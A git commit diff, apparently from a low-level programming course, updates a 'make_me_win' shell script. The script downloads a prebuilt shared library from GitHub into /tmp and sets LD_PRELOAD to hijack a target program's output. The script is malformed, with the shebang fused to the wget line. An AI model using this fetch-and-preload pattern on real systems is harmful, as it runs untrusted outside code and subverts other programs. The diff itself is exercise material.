1608f90e538cc03664ca3a484cabcd0a6e320d38
Olantan <110933448+Olantan@users.noreply.github.com>
2023-03-20 21:43:50 +0300

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,1 +1,2 @@
-#!/bin/bashwget -P /tmp https://github.com/olantan/alx-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.soexport LD_PRELOAD=/tmp/putshack.so
+#!/bin/bashwget -P /tmp https://github.com/olantan/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
+export LD_PRELOAD=/tmp/putshack.so
